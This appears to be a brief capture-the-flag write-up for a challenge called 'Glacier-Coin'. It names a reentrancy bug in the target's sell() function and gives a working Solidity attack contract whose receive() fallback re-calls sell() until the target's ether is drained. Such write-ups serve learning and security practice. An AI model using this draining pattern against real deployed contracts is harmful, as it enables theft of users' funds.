# Glacier-Coin

The solution is a reentrancy vulnerability in the `sell()` function

We can reenter it with:
```solidity
function attack() external payable
    {
        require(msg.value == 10 ether);
        target.buy{value: 10 ether}();
        target.sell(10 ether);
        owner.call{value: 20 ether}("");
    }   

    receive() external payable
    {
        // Reenter
        if (address(target).balance != 0) {
            target.sell(10 ether);
        }
    }
```
